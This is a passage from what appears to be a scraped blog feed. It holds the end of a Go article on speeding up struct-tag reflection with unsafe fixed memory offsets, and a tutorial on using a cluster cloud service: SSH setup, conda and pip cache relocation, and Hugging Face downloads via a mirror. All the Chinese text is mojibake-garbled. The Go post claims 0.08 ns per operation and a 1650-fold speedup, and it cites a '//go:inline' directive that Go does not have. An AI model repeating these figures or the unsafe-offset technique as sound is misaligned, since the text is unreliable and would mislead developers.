`orm:\"varchar(50)\" json:\"name\"`\n  Age  int    `json:\"age\"`\n}\n\nfunc main() {\n  t := reflect.TypeOf(User{})\n\n  // ä¼ ç»Ÿæ–¹å¼ï¼šä¼šæœ‰åˆ‡ç‰‡åˆ†é…å’Œå­—ç¬¦ä¸²æ‹·è´\n  field1, _ := t.Field(0)\n  tag1 := field1.Tag.Get(\"orm\")\n\n  // é›¶æ‹·è´æ–¹å¼ï¼šé¿å…æ— æ„ä¹‰çš„åˆ†é…\n  st := zerorefl.Type2StructType(t)\n  if st != nil {\n    var field reflect.StructField\n    if zerorefl.GetField(&amp;field, st, 0) {\n      tag2, _ := zerorefl.GetTag(field.Tag, \"orm\")\n      fmt.Printf(\"Tagå€¼: %s (é›¶æ‹·è´)\\n\", tag2)\n    }\n  }\n\n  fmt.Printf(\"ä¼ ç»Ÿæ–¹å¼Tagå€¼: %s\\n\", tag1)\n}\n</code></pre>\n<h3 id=\"45-æ€§èƒ½å¯¹æ¯”\">4.5 æ€§èƒ½å¯¹æ¯”</h3>\n<p>åŒæ ·æµ‹è¯•ç¯å¢ƒä¸‹ï¼ˆå¾ªç¯100ä¸‡æ¬¡è§£æUserç»“æ„ä½“çš„3ä¸ªå­—æ®µTagï¼‰ï¼š</p>\n<table>\n<thead>\n<tr>\n<th>æ“ä½œæ–¹å¼</th>\n<th>æ€»è€—æ—¶</th>\n<th>å•æ¬¡å¹³å‡è€—æ—¶</th>\n<th>æ€§èƒ½æå‡</th>\n<th>å†…å­˜åˆ†é…</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>å®˜æ–¹åå°„åŒ…</td>\n<td>132ms</td>\n<td>132ns/æ¬¡</td>\n<td>-</td>\n<td>å¤§é‡</td>\n</tr>\n<tr>\n<td>é›¶æ‹·è´ä¼˜åŒ–æ–¹æ¡ˆ</td>\n<td>0.08ms</td>\n<td>0.08ns/æ¬¡</td>\n<td>çº¦1650å€</td>\n<td>å‡ ä¹ä¸º0</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"46-æ ¸å¿ƒä¼˜åŒ–ç‚¹\">4.6 æ ¸å¿ƒä¼˜åŒ–ç‚¹</h3>\n<ol>\n<li><strong>ä¸åˆ†é…åˆ‡ç‰‡</strong>ï¼šä¸è®¾ç½® <code>StructField.Index</code> å­—æ®µï¼Œé¿å…æ¯æ¬¡éƒ½åˆ›å»º <code>[]int{i}</code> åˆ‡ç‰‡</li>\n<li><strong>å°‘æ‹·è´å­—ç¬¦ä¸²</strong>ï¼š<code>GetTag</code> åœ¨ä¸éœ€è¦è½¬ä¹‰æ—¶ç›´æ¥è¿”å›å­—ç¬¦ä¸²åˆ‡ç‰‡ï¼Œé¿å… <code>strconv.Unquote</code> çš„å†…å­˜åˆ†é…</li>\n<li><strong>ç”¨å›ºå®šåç§»é‡</strong>ï¼š<code>abiTypeSize = 48</code> å¸¸é‡ï¼Œç›´æ¥å®šä½åˆ° <code>structType</code> çš„èµ·å§‹åœ°å€</li>\n<li><strong>å†…è”ä¼˜åŒ–</strong>ï¼šæ‰€æœ‰æ ¸å¿ƒæ–¹æ³•éƒ½ç”¨äº† <code>//go:inline</code>ï¼Œå‡å°‘å‡½æ•°è°ƒç”¨å¼€é”€</li>\n</ol>\n<h2 id=\"äº”å®‰å…¨æ€§å’Œå…¼å®¹æ€§\">äº”ã€å®‰å…¨æ€§å’Œå…¼å®¹æ€§</h2>\n<h3 id=\"51-å®‰å…¨æ€§\">5.1 å®‰å…¨æ€§</h3>\n<ul>\n<li><strong>åªè¯»æ“ä½œ</strong>ï¼šæ‰€æœ‰æ“ä½œéƒ½æ˜¯è¯»åªè¯»å†…å­˜ï¼Œä¸ä¼šæ”¹åŸå§‹æ•°æ®</li>\n<li><strong>å›ºå®šåç§»é‡</strong>ï¼šåŸºäºGo1.14+çš„ç¨³å®šå†…å­˜å¸ƒå±€ï¼Œä¸ä¼šè¶Šç•Œ</li>\n<li><strong>ç±»å‹æ ¡éªŒ</strong>ï¼šæ“ä½œå‰éƒ½ä¼šæ£€æŸ¥ç±»å‹æ˜¯ä¸æ˜¯ç»“æ„ä½“</li>\n</ul>\n<h3 id=\"52-å…¼å®¹æ€§\">5.2 å…¼å®¹æ€§</h3>\n<ul>\n<li><strong>Go1.14+</strong>ï¼šé€‚ç”¨äºGo1.14åŠä»¥ä¸Šç‰ˆæœ¬ï¼Œå› ä¸º <code>abi.Type</code> çš„å†…å­˜å¸ƒå±€ä»1.14å¼€å§‹å›ºå®š</li>\n<li><strong>è·¨å¹³å°</strong>ï¼š64ä½æ¶æ„ï¼ˆamd64/arm64ï¼‰ä¸‹ï¼Œ<code>abiTypeSize = 48</code> æ˜¯å›ºå®šçš„</li>\n</ul>\n<h2 id=\"å…­æ€»ç»“\">å…­ã€æ€»ç»“</h2>\n<p>é€šè¿‡ç›´æ¥æ“ä½œ <code>runtime</code> å±‚çš„ <code>abi.Type</code> ç»“æ„ä½“ï¼Œå®ç°äº†é›¶æ‹·è´çš„åå°„ä¼˜åŒ–ï¼š</p>\n<ol>\n<li><strong>æ ¸å¿ƒæ€è·¯</strong>ï¼šç»•å¼€ <code>reflect</code> åŒ…çš„å°è£…ï¼Œç›´æ¥è®¿é—®åº•å±‚ <code>abi.Type</code></li>\n<li><strong>å…³é”®æŠ€æœ¯</strong>ï¼šå›ºå®šåç§»é‡ + unsafe æ“ä½œ + é¿å…æ— æ„ä¹‰çš„å†…å­˜åˆ†é…</li>\n<li><strong>æ€§èƒ½æå‡</strong>ï¼šæ¯”å®˜æ–¹åå°„åŒ…å¿«1000+å€ï¼Œå†…å­˜åˆ†é…å‡ ä¹ä¸ºé›¶</li>\n</ol>\n<p>è¿™ä¸ªæ–¹æ¡ˆé€‚ç”¨äºé«˜é¢‘åå°„åœºæ™¯ï¼ŒåƒORMã€åºåˆ—åŒ–æ¡†æ¶è¿™äº›åœ°æ–¹ï¼Œèƒ½æ˜¾è‘—æå‡æ€§èƒ½ã€‚</p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-30 22:01</span>&nbsp;\n<a href=\"https://www.cnblogs.com/fgaoxing\">Fgaoxing</a>&nbsp;\né˜…è¯»(<span id=\"post_view_count\">46</span>)&nbsp;\nè¯„è®º(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">æ”¶è—</a>&nbsp;\n<a href=\"\">ä¸¾æŠ¥</a>\n</div>"
    },
    {
      "title": "ä»¥è‹±åšäº‘ä¸ºä¾‹ä»‹ç»é›†ç¾¤äº‘æœåŠ¡å™¨çš„ä½¿ç”¨",
      "link": "https://www.cnblogs.com/RunfarAI/p/19555772",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/RunfarAI/p/19555772\" id=\"cb_post_title_url\" title=\"å‘å¸ƒäº 2026-01-30 21:23\">\n    <span>ä»¥è‹±åšäº‘ä¸ºä¾‹ä»‹ç»é›†ç¾¤äº‘æœåŠ¡å™¨çš„ä½¿ç”¨</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p></p><div class=\"toc\"><div class=\"toc-container-header\">ç›®å½•</div><ul><li><a href=\"#åŸºæœ¬å…³ç³»\" rel=\"noopener nofollow\">åŸºæœ¬å…³ç³»</a></li><li><a href=\"#å¼€å‘æœºä½¿ç”¨\" rel=\"noopener nofollow\">å¼€å‘æœºä½¿ç”¨</a></li><li><a href=\"#å¼€åˆ›ç¯å¢ƒç›˜\" rel=\"noopener nofollow\">å¼€åˆ›ç¯å¢ƒç›˜</a></li><li><a href=\"#ç¯å¢ƒé…ç½®\" rel=\"noopener nofollow\">ç¯å¢ƒé…ç½®</a><ul><li><a href=\"#æ›´æ”¹condaçš„ç¯å¢ƒå­˜æ”¾ä½ç½®\" rel=\"noopener nofollow\">æ›´æ”¹condaçš„ç¯å¢ƒå­˜æ”¾ä½ç½®</a></li><li><a href=\"#æ›´æ”¹pipç¼“å­˜çš„å­˜æ”¾ä½ç½®\" rel=\"noopener nofollow\">æ›´æ”¹pipç¼“å­˜çš„å­˜æ”¾ä½ç½®</a></li></ul></li><li><a href=\"#å…±äº«å­˜å‚¨å·\" rel=\"noopener nofollow\">å…±äº«å­˜å‚¨å·</a></li><li><a href=\"#é€šè¿‡huggingface_cliä¸‹è½½æ¨¡å‹å’Œæ•°æ®é›†\" rel=\"noopener nofollow\">é€šè¿‡huggingface_cliä¸‹è½½æ¨¡å‹å’Œæ•°æ®é›†</a></li><li><a href=\"#åŠ é€Ÿè®¿é—®\" rel=\"noopener nofollow\">åŠ é€Ÿè®¿é—®</a><ul><li><a href=\"#hfdaria2\" rel=\"noopener nofollow\">hfd+aria2</a></li><li><a href=\"#ä¸€æ­¥åˆ°ä½è‹±åšäº‘å†…ç½®åŠ é€ŸæœåŠ¡\" rel=\"noopener nofollow\">ä¸€æ­¥åˆ°ä½â€”â€”è‹±åšäº‘å†…ç½®åŠ é€ŸæœåŠ¡</a></li></ul></li></ul></div><p></p>\n<h1 id=\"åŸºæœ¬å…³ç³»\">åŸºæœ¬å…³ç³»</h1>\n<p>é›†ç¾¤ä¸‹ç®¡ç†ç€å¤šä¸ªå¼€å‘æœºï¼Œå¼€å‘æœºæ˜¯ç”¨æˆ·ä½¿ç”¨è®¡ç®—èµ„æºçš„åŸºæœ¬å•ä½ã€‚æ¯ä¸ªé›†ç¾¤æœ‰è‡ªå·±çš„å…±äº«å­˜å‚¨å·ã€å—å­˜å‚¨å·ä»¥åŠå¯¹è±¡å­˜å‚¨å·ã€‚ä¸åŒé›†ç¾¤çš„å­˜å‚¨ä¸å…±äº«ã€‚</p>\n<p>å…±äº«å­˜å‚¨å·ä¸€èˆ¬å­˜æ”¾æ•°æ®é›†ä¹‹ç±»çš„å¤§å‹è®­ç»ƒæ•°æ®ï¼Œå¯æŒ‚è½½åˆ°å¤šä¸ªå¼€å‘æœºï¼Œå—å­˜å‚¨ä¸€èˆ¬åªæŒ‚è½½åˆ°ä¸€ä¸ªå¼€å‘æœºã€‚å¯¹è±¡å­˜å‚¨ä¸»è¦æ˜¯å­˜æµ·é‡éç»“æ„åŒ–æ•°æ®ï¼Œå¦‚å›¾ç‰‡ã€éŸ³é¢‘ã€è§†é¢‘ã€æ–‡æœ¬ç­‰ã€‚</p>\n<h1 id=\"å¼€å‘æœºä½¿ç”¨\">å¼€å‘æœºä½¿ç”¨</h1>\n<p>ä»‹ç»ä¸¤ç§å¸¸ç”¨çš„ä½¿ç”¨æ–¹å¼ã€‚æ–¹å¼ä¸€ï¼Œå¼€æœºåä½¿ç”¨å¼€å‘æœºè‡ªå¸¦çš„Jupyterï¼Œå³ç‚¹å‡»JupyterLabã€‚åœ¨JupyterLabé‡Œå¯ä»¥é€šè¿‡è¿™ä¸ªæŒ‰é’®ä¸Šä¼ æ–‡ä»¶ï¼š</p>\n<p><img alt=\"\" src=\"https://yunhdan.github.io/assets/yingboyun1.png\" /></p>\n<p>ç„¶åçº¢æ¡†å·¦è¾¹çš„æŒ‰é’®æ˜¯åˆ›å»ºæ–°çš„ç›®å½•ï¼Œçº¢æ¡†å³è¾¹æ˜¯åˆ·æ–°ï¼Œè“è‰²åŠ å·æ˜¯æ‰“å¼€æ–°çš„Jupyteré¡µé¢ã€‚</p>\n<p>æ–¹å¼äºŒï¼Œç”¨ssh+VSCodeè¿æ¥ã€‚åœ¨VSCodeæœç´¢å¦‚ä¸‹ä¸¤ä¸ªæ’ä»¶ï¼š</p>\n<p><img alt=\"\" src=\"https://yunhdan.github.io/assets/yingboyun2.png\" /></p>\n<p><img alt=\"\" src=\"https://yunhdan.github.io/assets/yingboyun3.png\" /></p>\n<p>å®‰è£…å®Œæ¯•åé‡å¯VSCodeï¼Œç‚¹å‡»å·¦ä¾§çš„è¿œç¨‹èµ„æºç®¡ç†å™¨æ‰“å¼€sshæœåŠ¡å™¨é€‰æ‹©æ ï¼š</p>\n<p><img alt=\"\" src=\"https://yunhdan.github.io/assets/yingboyun4.png\" /></p>\n<p>ç‚¹ä¸­åŠ å·ï¼Œå¢åŠ è¿œç¨‹æœåŠ¡å™¨ï¼š</p>\n<p><img alt=\"\" src=\"https://yunhdan.github.io/assets/yingboyun5.png\" /></p>\n<p>æ‰“å¼€è‹±åšäº‘çš„å¼€å‘æœºé¡µé¢ï¼Œç‚¹å‡»å¼€å‘æœºçš„è¿œç¨‹è¿æ¥ï¼Œå¤åˆ¶ç™»é™†æ–¹å¼å‘½ä»¤ï¼š<br />\n<img alt=\"\" src=\"https://yunhdan.github.io/assets/yingboyun6.png\" /></p>\n<p>ç²˜è´´åˆ°å¼¹çª—ï¼š<br />\n<img alt=\"\" src=\"https://yunhdan.github.io/assets/yingboyun7.png\" /></p>\n<p>é€‰æ‹©è¦æ›´æ–°çš„sshé…ç½®æ–‡ä»¶ï¼Œæ²¡æœ‰å°±è‡ªå·±åˆ›å»ºä¸€ä¸ªï¼š</p>\n<p><img alt=\"\" src=\"https://yunhdan.github.io/assets/yingboyun8.png\" /></p>\n<p>åœ¨å¼¹å‡ºçš„é…ç½®é¡µé¢ä¸­é…ç½®sshï¼š</p>\n<p><img alt=\"\" src=\"https://yunhdan.github.io/assets/yingboyun9.png\" /></p>\n<p>Hostæ˜¯è¿œç¨‹æœåŠ¡å™¨åå­—ï¼Œå¯ä»¥è‡ªå·±å–ã€‚å‡å¦‚æˆ‘ä»¬å¤åˆ¶çš„sshç™»å½•æ–¹å¼æ˜¯ï¼š<code>ssh -p 39000 root@ssh-cn-huabei1.ebcloud.com</code>ï¼Œé‚£ä¹ˆHostNameå°±æ˜¯@åé¢çš„å†…å®¹ï¼ŒPortæ˜¯ssh - påé¢çš„æ•°å­—ï¼ŒUseræ˜¯@å‰é¢çš„rootã€‚</p>\n<p>ä¿å­˜åé€€å‡ºï¼Œç‚¹å‡»ç®­å¤´è¿›å…¥è¿æ¥ï¼š</p>\n<p><img alt=\"\" src=\"https://yunhdan.github.io/assets/yingboyun10.png\" /></p>\n<p>ä¼šè¦æ±‚é€‰æ‹©è¿œç¨‹å¹³å°ç±»å‹ï¼Œé€‰æ‹©Linuxï¼Œç„¶åä¼šå¼¹å‡ºæœ‰æŒ‡çº¹ï¼Œç‚¹å‡»ç»§ç»­åè¿›å…¥å¯†ç è¾“å…¥ï¼Œå¤åˆ¶è‹±åšäº‘å¼€å‘æœºè¿œç¨‹è¿æ¥çš„ç™»å½•å¯†ç ç„¶åç²˜è´´è¿‡å»å³å¯è¿æ¥ï¼š</p>\n<p><img alt=\"\" src=\"https://yunhdan.github.io/assets/yingboyun12.png\" /></p>\n<h1 id=\"å¼€åˆ›ç¯å¢ƒç›˜\">å¼€åˆ›ç¯å¢ƒç›˜</h1>\n<p>ç³»ç»Ÿç›˜é»˜è®¤æŒ‚è½½åˆ°rootç›®å½•ï¼Œè¿›å…¥rootç›®å½•ä¼šçœ‹åˆ°miniconda3å·²ç»å®‰è£…å¥½ï¼Œä¹‹åconda createçš„è™šæ‹Ÿç¯å¢ƒä¼šå®‰è£…åˆ°miniconda3/envsä¸­ï¼Œpipçš„ç¼“å­˜ä¹Ÿåœ¨rootç›®å½•ä¸‹ã€‚</p>\n<p>ç„¶è€Œç³»ç»Ÿç›˜åªæœ‰30Gï¼Œå°†æ¥åˆ›å»ºæ›´å¤šè™šæ‹Ÿç¯å¢ƒæ—¶ï¼Œè¿™ç‚¹ç©ºé—´æ˜¯è‚¯å®šä¸å¤Ÿçš„ã€‚å› æ­¤æ¨èå°†pipç¼“å­˜ä»¥åŠè™šæ‹Ÿç¯å¢ƒçš„ä½ç½®æ›´æ”¹åˆ°å…¶ä»–åœ°æ–¹ã€‚</p>\n<p>æˆ‘ä»¬åœ¨è‹±åšäº‘å¼€ä¸€ä¸ªå—å­˜å‚¨å·ï¼Œä¸“é—¨æ”¾ç½®ç¯å¢ƒï¼š</p>\n<p><img alt=\"\" src=\"https://yunhdan.github.io/assets/yingboyun11.png\" /></p>\n<p>å­˜å‚¨ç©ºé—´å¯ä»¥å–å¤§äº›ï¼Œæ¯”å¦‚64Gã€128Gã€‚ç„¶ååˆ°å¼€å‘æœºä¸­æ›´æ”¹å®ä¾‹é…ç½®ï¼Œä¸‹æ»‘åˆ°å­˜å‚¨é…ç½®ï¼Œåœ¨å—å­˜å‚¨å·ä¸­æŒ‚è½½ä½ æ–°å¼€çš„å­˜å‚¨å·ï¼Œç„¶åæŒ‚è½½è·¯å¾„è‡ªå®šï¼Œä¹‹ååœ¨è¿™ä¸ªè·¯å¾„æ”¾ä¸œè¥¿å°±ç›¸å½“äºæ”¾åˆ°è¿™ä¸ªæ–°ç›˜ã€‚</p>\n<blockquote>\n<p>ä¸ºä»€ä¹ˆè¦å¼€ä¸€ä¸ªæ–°ç›˜æ”¾ç¯å¢ƒå·²ç»è®²æ¸…æ¥šäº†ã€‚é‚£ä¹ˆä¸ºä»€ä¹ˆé€‰æ‹©å—å­˜å‚¨å·è€Œä¸æ˜¯å…±äº«å­˜å‚¨å·æ”¾ç½®ç¯å¢ƒï¼Ÿè¿™æ˜¯å› ä¸ºä¸€ä¸ªå—å­˜å‚¨å·åªèƒ½æŒ‚è½½åˆ°ä¸€ä¸ªå¼€å‘æœºï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœä½ æŠŠè¿™ä¸ªæ–°ç›˜æŒ‚è½½åˆ°ä½ çš„å¼€å‘æœºï¼Œé‚£ä¹ˆå…¶ä»–å¼€å‘æœºå°±æ— æ³•å†è®¿é—®è¿™ä¸ªç›˜çš„æ•°æ®ï¼Œå°±èƒ½å¤Ÿé¿å…äº†ç¯å¢ƒè¢«å…¶ä»–å¼€å‘æœºåˆ é™¤çš„æƒ…å†µï¼Œè€Œä¸”å…è®¸äº†ä¸åŒçš„å¼€å‘æœºæœ‰ä¸åŒçš„è™šæ‹Ÿç¯å¢ƒåã€‚</p>\n</blockquote>\n<blockquote>\n<p>å¦‚æœå·²ç»å¼€è¿‡ä¸€ä¸ªç¯å¢ƒç›˜ï¼Œè¿˜æœ‰ç©ºé—´çš„è¯ï¼Œé‚£å°±ä¸ç”¨å†å¼€äº†ï¼Œè¿™é‡Œæ˜¯é’ˆå¯¹æ–°åˆ›å»ºæœºå™¨çš„ã€‚</p>\n</blockquote>\n<h1 id=\"ç¯å¢ƒé…ç½®\">ç¯å¢ƒé…ç½®</h1>\n<h2 id=\"æ›´æ”¹condaçš„ç¯å¢ƒå­˜æ”¾ä½ç½®\">æ›´æ”¹condaçš„ç¯å¢ƒå­˜æ”¾ä½ç½®</h2>\n<p>è¿›å…¥æ ¹ç›®å½•ä¸‹çš„condaç›®å½•ï¼ˆé€šå¸¸å«miniconda3æˆ–è€…anaconda3ï¼‰ï¼Œåœ¨è¯¥çº§ç›®å½•ä¸‹æ‰¾åˆ°<code>.condarc</code>è¿™ä¸ªæ–‡ä»¶ï¼Œæ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š</p>\n<pre><code class=\"language-raw\">envs_dirs:\n  - /data/envs\n</code></pre>\n<p>/data/envsæ˜¯ä½ è‡ªå®šä¹‰çš„å­˜æ”¾è™šæ‹Ÿç¯å¢ƒçš„ä½ç½®ï¼Œä¸€èˆ¬æ˜¯åœ¨å‰é¢æ–°ç›˜çš„æŒ‚è½½è·¯å¾„ä¸‹ã€‚ä¿å­˜åï¼Œä»¥ååˆ›å»ºè™šæ‹Ÿç¯å¢ƒå°±èƒ½è‡ªåŠ¨åœ¨è¿™ä¸ªç›®å½•ä¸‹åˆ›å»ºäº†ã€‚åŒæ—¶ï¼Œä½ å¯ä»¥æŠŠè™šæ‹Ÿç¯å¢ƒenvç›®å½•ç§»åŠ¨åˆ°è¿™ä¸ªè‡ªå®šä¹‰çš„ä½ç½®ï¼Œcondaä¹Ÿä¼šè¯†åˆ«åˆ°è™šæ‹Ÿç¯å¢ƒã€‚</p>\n<p>è¿™æ ·ï¼Œå¤šä¸ªè™šæ‹Ÿç¯å¢ƒå°±ä¼šå®‰è£…åˆ°å—å­˜å‚¨å·ä¸­ï¼Œé¿å…äº†ç³»ç»Ÿç›˜çš„è‡ƒè‚¿ã€‚</p>\n<h2 id=\"æ›´æ”¹pipç¼“å­˜çš„å­˜æ”¾ä½ç½®\">æ›´æ”¹pipç¼“å­˜çš„å­˜æ”¾ä½ç½®</h2>\n<p>pipçš„ç¼“å­˜æ˜¯å…¨å±€çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æ‰€æœ‰çš„è™šæ‹Ÿç¯å¢ƒçš„pipç¼“å­˜éƒ½å°†å­˜æ”¾åˆ°ä¸€ä¸ªåœ°æ–¹ï¼Œä¸€èˆ¬é»˜è®¤å­˜æ”¾åˆ°æ ¹ç›®å½•rootä¸‹çš„<code>.cache</code>ç›®å½•ä¸‹ã€‚è¿™æ—¶å¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤æ›´æ”¹pipç¼“å­˜çš„å­˜æ”¾ä½ç½®ï¼š</p>\n<pre><code class=\"language-bash\">pip config set global.cache-dir \"/home/your_path\"\n</code></pre>\n<p>æˆ–è€…è¿›å…¥æ ¹ç›®å½•ä¸‹çš„<code>.config/pip</code>ç›®å½•ï¼Œæ‰¾åˆ°pip.confæ–‡ä»¶ï¼Œæ‰“å¼€å¯ä»¥å‘ç°æœ‰å¦‚ä¸‹å†…å®¹ï¼š</p>\n<pre><code class=\"language-raw\">[global]\ncache-dir = /data/pip_cache\n</code></pre>\n<p>åœ¨cache-dirå­—æ®µæ›´æ”¹ä¸ºè‡ªå®šä¹‰çš„è·¯å¾„ä½ç½®å³å¯ã€‚</p>\n<p>å¦‚æœä½ æƒ³æ¢å¤é»˜è®¤è®¾ç½®ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š</p>\n<pre><code class=\"language-bash\">pip config unset global.cache-dir\n</code></pre>\n<blockquote>\n<p>åŒæ ·ï¼Œå¦‚æœä¹‹å‰å·²ç»æ›´æ”¹è¿‡äº†é…ç½®çš„å¼€å‘æœºï¼Œå°±æ²¡å¿…è¦å†æ›´æ”¹äº†ã€‚</p>\n</blockquote>\n<h1 id=\"å…±äº«å­˜å‚¨å·\">å…±äº«å­˜å‚¨å·</h1>\n<p>ç¡®ä¿ä½ çš„å¼€å‘æœºåšå¥½äº†å…±äº«å­˜å‚¨å·çš„æŒ‚è½½ï¼Œæ‰“å¼€å¼€å‘æœºçš„å®ä¾‹é…ç½®ï¼Œä¸‹æ»‘åˆ°å­˜å‚¨é…ç½®ï¼š</p>\n<p><img alt=\"\" src=\"https://yunhdan.github.io/assets/yingboyun13.png\" /></p>\n<p>æ·»åŠ å…±äº«å­˜å‚¨å·åï¼Œä¸ºå…¶å®šä¹‰æŒ‚è½½è·¯å¾„ï¼Œè¿™æ ·ä¹‹åä»£ç å’Œæ•°æ®é›†å¯ä»¥æ”¾åˆ°å¼€å‘æœºçš„è¿™ä¸ªè·¯å¾„ä¸‹ã€‚</p>\n<p>å…³äºå…±äº«å­˜å‚¨å·ï¼Œå»ºè®®æ¯ä¸ªäººç”¨è‡ªå·±çš„æ‹¼éŸ³åæ¥å‘½åè‡ªå·±çš„æ–‡ä»¶å¤¹ï¼Œç„¶ååœ¨è¿™ä¸ªè‡ªå·±çš„æ–‡ä»¶å¤¹ä¸‹æ”¾è‡ªå·±çš„æ•°æ®ï¼Œè¿™æ ·ä¾¿äºæŸ¥æ‰¾ï¼Œé˜²æ­¢å†²çªã€‚</p>\n<h1 id=\"é€šè¿‡huggingface_cliä¸‹è½½æ¨¡å‹å’Œæ•°æ®é›†\">é€šè¿‡huggingface_cliä¸‹è½½æ¨¡å‹å’Œæ•°æ®é›†</h1>\n<p>é™¤äº†ç›´æ¥åˆ°ç½‘é¡µç«¯ç‚¹å‡»ä¸‹è½½æŒ‰é’®ä¹‹å¤–ï¼Œè¿˜å¯ä»¥åœ¨ç»ˆç«¯ç”¨å‘½ä»¤è¡Œçš„æ–¹å¼ä¸‹è½½æ•°æ®é›†å’Œæ¨¡å‹ã€‚</p>\n<p>é¦–å…ˆåº”è¯¥å®‰è£…huggingface_hubå·¥å…·ï¼š</p>\n<pre><code class=\"language-bash\">pip install -U huggingface_hub\n</code></pre>\n<p>huggingface-cliå·²ç»å¼ƒç”¨ï¼Œhuggingface-cliå·²ç»æ›´æ–°ä¸ºhfå‘½ä»¤ã€‚å…³äºhfå‘½ä»¤æœ‰å“ªäº›å˜åŒ–ï¼Œå¯ä»¥è€ƒè™‘å­¦ä¹ è¿™ç¯‡æ–‡ç« ï¼š<a href=\"https://zhuanlan.zhihu.com/p/663712983?s_r=0%E3%80%82\" rel=\"noopener nofollow\" target=\"_blank\">https://zhuanlan.zhihu.com/p/663712983?s_r=0ã€‚</a></p>\n<p>åœ¨Windowsï¼Œä½ å¯ä»¥ä¾æ¬¡æ‰§è¡Œï¼š</p>\n<pre><code class=\"language-bash\">$env:HF_ENDPOINT = \"https://hf-mirror.com\"\nhf download --resume-download [model name] --local-dir [save location]\n</code></pre>\n<p>åœ¨æ‹¬å·å†…æ›¿æ¢ä¸ºå…·ä½“çš„å†…å®¹ã€‚model nameæ˜¯huggingfaceæŸä¸ªä»“åº“å…·ä½“çš„åå­—ï¼Œæ¯”å¦‚ä¸‹é¢çš„<code>ShengbinYue/DISC-Law-SFT</code>ã€‚save locationåˆ™æ˜¯ä¿å­˜åˆ°æœ¬åœ°çš„ç›®å½•åã€‚</p>\n<p><img alt=\"\" src=\"https://yunhdan.github.io/assets/huggingface1.png\" /></p>\n<p>ä¸‹è½½æ•°æ®é›†çš„å‘½ä»¤åˆ™æ˜¯åœ¨å‰é¢ä¸‹è½½æ¨¡å‹çš„å‘½ä»¤å¢åŠ <code>--repo-type dataset</code>å‚æ•°ã€‚åœ¨Linuxå¹³å°ï¼Œä½ å¯ä»¥è€ƒè™‘æŠŠæ‰§è¡Œ<code>$env:HF_ENDPOINT = \"https://hf-mirror.com</code>æ¢æˆæ‰§è¡Œï¼š</p>\n<pre><code class=\"language-bash\">export HF_ENDPOINT=\"https://hf-mirror.com\"\n</code></pre>\n<blockquote>\n<p>$env:HF_ENDPOINT = \"<a href=\"https://hf-mirror.com\" rel=\"noopener nofollow\" target=\"_blank\">https://hf-mirror.com</a>\" å’Œ export HF_ENDPOINT=\"<a href=\"https://hf-mirror.com\" rel=\"noopener nofollow\" target=\"_blank\">https://hf-mirror.com</a>\" çš„ç›®çš„å°±æ˜¯åœ¨äºè§£å†³å›½å†…è®¿é—®huggingfaceæœåŠ¡å™¨å¤±è´¥çš„é—®é¢˜ã€‚è®¾ç½®è¿™å‘½ä»¤å°±æ˜¯æä¾›ä¸€ä¸ªé•œåƒä»¥ä¾¿æ›´å¿«åœ°è®¿é—®ï¼Œè¿™ä¸ªæ˜¯å®˜æ–¹çš„é•œåƒï¼Œé€Ÿåº¦å¿«ã€‚</p>\n</blockquote>\n<h1 id=\"åŠ é€Ÿè®¿é—®\">åŠ é€Ÿè®¿é—®</h1>\n<p>å¦‚æœä½ å‘ç°ä¸Šé¢çš„æ–¹æ³•ä¸‹è½½é€Ÿåº¦è¿˜æ˜¯å¾ˆæ…¢ï¼Œä½ å¯ä»¥å‚è€ƒä¸‹é¢çš„åšæ³•ã€‚</p>\n<h2 id=\"hfdaria2\">hfd+aria2</h2>\n<p>é¦–å…ˆä¸‹è½½hfdå’Œaria2cï¼š</p>\n<pre><code class=\"language-bash\">wget https://hf-mirror.com/hfd/hfd.sh\nchmod a+x hfd.sh\n\nsudo apt-get install aria2\nsudo apt-get install git-lfs\n</code></pre>\n<p>hfdè¿™ç©æ„é»˜è®¤å®‰è£…åˆ°å½“å‰è·¯å¾„ä¸‹ã€‚</p>\n<p>è®¾ç½®ç¯å¢ƒå˜é‡ï¼š</p>\n<pre><code class=\"language-bash\">export HF_ENDPOINT=https://hf-mirror.com\n</code></pre>\n<p>ä¸‹è½½æ¨¡å‹/æ•°æ®é›†ï¼š</p>\n<pre><code class=\"language-bash\">./hfd.sh [model/datasets] --tool aria2c -x 8\n</code></pre>\n<h2 id=\"ä¸€æ­¥åˆ°ä½è‹±åšäº‘å†…ç½®åŠ é€ŸæœåŠ¡\">ä¸€æ­¥åˆ°ä½â€”â€”è‹±åšäº‘å†…ç½®åŠ é€ŸæœåŠ¡</h2>\n<p>ç¡®ä¿å®‰è£…å¥½äº†hfdå’Œaria2cï¼Œæ²¡æœ‰å°±çœ‹ä¸Šé¢å…ˆå®‰è£…å¥½ã€‚</p>\n<p>æ­¤æ—¶<strong>ä¸</strong>è®¾ç½®ç¯å¢ƒå˜é‡<code>export HF_ENDPOINT=https://hf-mirror.com</code>ã€‚åœ¨ç»ˆç«¯è¾“å…¥å‘½ä»¤ï¼š</p>\n<pre><code class=\"language-bash\">source /public/bin/network_accelerate\n</code></pre>\n<p>è¿™ä¸ªå‘½ä»¤å¯ä»¥åœ¨å½“å‰ç»ˆç«¯æ‰“å¼€è‹±åšäº‘çš„åŠ é€ŸæœåŠ¡ï¼Œæ”¯æŒè®¿é—®githubã€huggingfaceã€wandbç­‰ã€‚</p>\n<p>å–æ¶ˆåŠ é€Ÿçš„å‘½ä»¤å¯å‚è€ƒï¼š</p>\n<pre><code class=\"language-bash\">source /public/bin/network_accelerate_stop\n</code></pre>\n<p>è®¾ç½®äº†åŠ é€Ÿåï¼Œå†è¾“å…¥ä¸‹è½½å‘½ä»¤ï¼š</p>\n<pre><code class=\"language-bash\">./hfd.sh [model/datasets] --tool 